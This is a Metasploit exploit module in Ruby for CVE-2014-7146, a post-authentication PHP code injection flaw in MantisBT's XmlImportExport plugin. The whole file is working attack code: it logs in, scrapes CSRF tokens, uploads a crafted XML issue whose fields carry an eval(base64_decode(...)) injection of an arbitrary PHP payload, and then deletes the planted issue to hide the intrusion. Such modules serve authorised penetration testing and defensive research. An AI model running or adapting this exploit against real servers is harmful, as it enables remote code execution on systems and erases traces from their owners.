# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require &#039;msf/core&#039;

class Metasploit3 < Msf::Exploit::Remote
  Rank = GreatRanking

  include Msf::Exploit::Remote::HttpClient

  def initialize(info = {})
    super(update_info(info,
      &#039;Name&#039;           => &#039;MantisBT XmlImportExport Plugin PHP Code Injection Vulnerability&#039;,
      &#039;Description&#039;    => %q{
        This module exploits a post-auth vulnerability found in MantisBT versions 1.2.0a3 up to 1.2.17 when the Import/Export plugin is installed.
        This allows a remote authenticated attacker to execute arbitrary PHP code on the remote machine.
      },
      &#039;License&#039;        => MSF_LICENSE,
      &#039;Author&#039;         =>
        [
          &#039;Egidio Romano&#039;, # discovery http://karmainsecurity.com
          &#039;Juan Escobar <eng.jescobar[at]gmail.com>&#039;, # module development @itsecurityco
        ],
      &#039;References&#039;     =>
        [
          [&#039;CVE&#039;, &#039;2014-7146&#039;]
        ],
      &#039;Platform&#039;       => &#039;php&#039;,
      &#039;Arch&#039;           => ARCH_PHP,
      &#039;Targets&#039;        => [[&#039;Generic (PHP Payload)&#039;, {}]],
      &#039;DisclosureDate&#039; => &#039;Nov 8 2014&#039;,
      &#039;DefaultTarget&#039;  => 0))

      register_options(
      [
        OptString.new(&#039;USERNAME&#039;, [ true, &#039;Username to authenticate as&#039;, &#039;administrator&#039;]),
        OptString.new(&#039;PASSWORD&#039;, [ true, &#039;Pasword to authenticate as&#039;, &#039;root&#039;]),
        OptString.new(&#039;TARGETURI&#039;, [ true, &#039;Base directory path&#039;, &#039;/&#039;])
      ], self.class)
  end

  def check
    res = exec_php(&#039;phpinfo(); die();&#039;, true)

    if res && res.body =~ /This program makes use of the Zend/
      return Exploit::CheckCode::Vulnerable
    else
      return Exploit::CheckCode::Unknown
    end
  end

  def do_login()
    print_status(&#039;Checking access to MantisBT...&#039;)
    res = send_request_cgi({
      &#039;method&#039;   => &#039;GET&#039;,
      &#039;uri&#039;      => normalize_uri(target_uri.path, &#039;login_page.php&#039;),
      &#039;vars_get&#039; => {
        &#039;return&#039;  => normalize_uri(target_uri.path, &#039;plugin.php?page=XmlImportExport/import&#039;)
      }
    })

    fail_with(Failure::NoAccess, &#039;Error accessing MantisBT&#039;) unless res && res.code == 200

    session_cookie = res.get_cookies

    print_status(&#039;Logging in...&#039;)
    res = send_request_cgi({
      &#039;method&#039;    => &#039;POST&#039;,
      &#039;uri&#039;       => normalize_uri(target_uri.path, &#039;login.php&#039;),
      &#039;cookie&#039;    => session_cookie,
      &#039;vars_post&#039; => {
        &#039;return&#039;  => normalize_uri(target_uri.path, &#039;plugin.php?page=XmlImportExport/import&#039;),
        &#039;username&#039; => datastore[&#039;username&#039;],
        &#039;password&#039; => datastore[&#039;password&#039;],
        &#039;secure_session&#039; => &#039;on&#039;
      }
    })


    fail_with(Failure::NoAccess, &#039;Login failed&#039;) unless res && res.code == 302

    fail_with(Failure::NoAccess, &#039;Wrong credentials&#039;) unless res.redirection.to_s !~ /login_page.php/

    "#{session_cookie} #{res.get_cookies}"
  end

  def upload_xml(payload_b64, rand_text, cookies, is_check)

    if is_check
      timeout = 20
    else
      timeout = 3
    end

    rand_num = Rex::Text.rand_text_numeric(1, 9)

    print_status(&#039;Checking XmlImportExport plugin...&#039;)
    res = send_request_cgi({
      &#039;method&#039;   => &#039;GET&#039;,
      &#039;uri&#039;      => normalize_uri(target_uri.path, &#039;plugin.php&#039;),
      &#039;cookie&#039;   => cookies,
      &#039;vars_get&#039; => {
        &#039;page&#039; => &#039;XmlImportExport/import&#039;
      }
    })

    unless res && res.code == 200
      print_error(&#039;Error trying to access XmlImportExport/import page...&#039;)
      return false
    end

    # Retrieving CSRF token
    if res.body =~ /name="plugin_xml_import_action_token" value="(.*)"/
      csrf_token = Regexp.last_match[1]
    else
      print_error(&#039;Error trying to read CSRF token&#039;)
      return false
    end

    # Retrieving default project id
    if res.body =~ /name="project_id" value="([0-9]+)"/
      project_id = Regexp.last_match[1]
    else
      print_error(&#039;Error trying to read project id&#039;)
      return false
    end

    # Retrieving default category id
    if res.body =~ /name="defaultcategory">[.|\r|\r\n]*<option value="([0-9])" selected="selected" >\(select\)<\/option><option value="1">\[All Projects\] (.*)<\/option>/
      category_id = Regexp.last_match[1]
      category_name = Regexp.last_match[2]
    else
      print_error(&#039;Error trying to read default category&#039;)
      return false
    end

    # Retrieving default max file size
    if res.body =~ /name="max_file_size" value="([0-9]+)"/
      max_file_size = Regexp.last_match[1]
    else
      print_error(&#039;Error trying to read default max file size&#039;)
      return false
    end

    # Retrieving default step
    if res.body =~ /name="step" value="([0-9]+)"/
      step = Regexp.last_match[1]
    else
      print_error(&#039;Error trying to read default step value&#039;)
      return false
    end

    xml_file =   %Q|
    <mantis version="1.2.17" urlbase="http://localhost/" issuelink="${eval(base64_decode(#{ payload_b64 }))}}" notelink="~" format="1">
        <issue>
            <id>#{ rand_num }</id>
            <project id="#{ project_id }">#{ rand_text }</project>
            <reporter id="#{ rand_num }">#{ rand_text }</reporter>
            <priority id="30">normal</priority>
            <severity id="50">minor</severity>
            <reproducibility id="70">have not tried</reproducibility>
            <status id="#{ rand_num }">new</status>
            <resolution id="#{ rand_num }">open</resolution>
            <projection id="#{ rand_num }">none</projection>
            <category id="#{ category_id }">#{ category_name }</category>
            <date_submitted>1415492267</date_submitted>
            <last_updated>1415507582</last_updated>
            <eta id="#{ rand_num }">none</eta>
            <view_state id="#{ rand_num }">public</view_state>
            <summary>#{ rand_text }</summary>
            <due_date>1</due_date>
            <description>{${eval(base64_decode(#{ payload_b64 }))}}1</description>
        </issue>
    </mantis>
    |

    data = Rex::MIME::Message.new
    data.add_part("#{ csrf_token }", nil, nil, "form-data; name=\"plugin_xml_import_action_token\"")
    data.add_part("#{ project_id }", nil, nil, "form-data; name=\"project_id\"")
    data.add_part("#{ max_file_size }", nil, nil, "form-data; name=\"max_file_size\"")
    data.add_part("#{ step }", nil, nil, "form-data; name=\"step\"")
    data.add_part(xml_file, "text/xml", "UTF-8", "form-data; name=\"file\"; filename=\"#{ rand_text }.xml\"")
    data.add_part("renumber", nil, nil, "form-data; name=\"strategy\"")
    data.add_part("link", nil, nil, "form-data; name=\"fallback\"")
    data.add_part("on", nil, nil, "form-data; name=\"keepcategory\"")
    data.add_part("#{ category_id }", nil, nil, "form-data; name=\"defaultcategory\"")
    data_post = data.to_s

    print_status(&#039;Sending payload...&#039;)
    return send_request_cgi({
      &#039;method&#039;  => &#039;POST&#039;,
      &#039;uri&#039;     => normalize_uri(target_uri.path, &#039;plugin.php?page=XmlImportExport/import_action&#039;),
      &#039;cookie&#039; => cookies,
      &#039;ctype&#039;   => "multipart/form-data; boundary=#{ data.bound }",
      &#039;data&#039;    => data_post
    }, timeout)
  end

  def exec_php(php_code, is_check = false)

    # remove comments, line breaks and spaces of php_code
    payload_clean = php_code.gsub(/(\s+)|(#.*)/, &#039;&#039;)

    # clean b64 payload
    while Rex::Text.encode_base64(payload_clean) =~ /=/
      payload_clean = "#{ payload_clean } "
    end
    payload_b64 = Rex::Text.encode_base64(payload_clean)

    rand_text = Rex::Text.rand_text_alpha(5, 8)

    cookies = do_login()

    res_payload = upload_xml(payload_b64, rand_text, cookies, is_check)

    # Must login again in order to recover the communication. Thanks to @FireFart for figure out how to fix it.
    cookies = do_login()

    print_status("Deleting issue (#{ rand_text })...")
    res = send_request_cgi({
      &#039;method&#039; => &#039;GET&#039;,
      &#039;uri&#039;    => normalize_uri(target_uri.path, &#039;my_view_page.php&#039;),
      &#039;cookie&#039; => cookies
    })

    unless res && res.code == 200
      print_error(&#039;Error trying to access My View page&#039;)
      return false
    end

    if res.body =~ /title="\[@[0-9]+@\] #{ rand_text }">0+([0-9]+)<\/a>/
      issue_id = Regexp.last_match[1]
     else
      print_error(&#039;Error trying to retrieve issue id&#039;)
      return false
    end

    res = send_request_cgi({
      &#039;method&#039;   => &#039;GET&#039;,
      &#039;uri&#039;      => normalize_uri(target_uri.path, &#039;bug_actiongroup_page.php&#039;),
      &#039;cookie&#039;   => cookies,
      &#039;vars_get&#039; => {
        &#039;bug_arr[]&#039; => issue_id,
        &#039;action&#039; => &#039;DELETE&#039;,
      },
    })

    if res && res.body =~ /name="bug_actiongroup_DELETE_token" value="(.*)"\/>/
      csrf_token = Regexp.last_match[1]
    else
      print_error(&#039;Error trying to retrieve CSRF token&#039;)
      return false
    end

    res = send_request_cgi({
      &#039;method&#039;   => &#039;POST&#039;,
      &#039;uri&#039;      => normalize_uri(target_uri.path, &#039;bug_actiongroup.php&#039;),
      &#039;cookie&#039;   => cookies,
      &#039;vars_post&#039; => {
        &#039;bug_actiongroup_DELETE_token&#039; => csrf_token,
        &#039;bug_arr[]&#039; => issue_id,
        &#039;action&#039; => &#039;DELETE&#039;,
      },
    })

    if res && res.code == 302 || res.body !~ /Issue #{ issue_id } not found/
      print_status("Issue number (#{ issue_id }) removed")
    else
      print_error("Removing issue number (#{ issue_id }) has failed")
      return false
    end

    # if check return the response
    if is_check
      return res_payload
    else
      return true
    end
  end

  def exploit
    unless exec_php(payload.encoded)
      fail_with(Failure::Unknown, &#039;Exploit failed, aborting.&#039;)
    end
  end
end

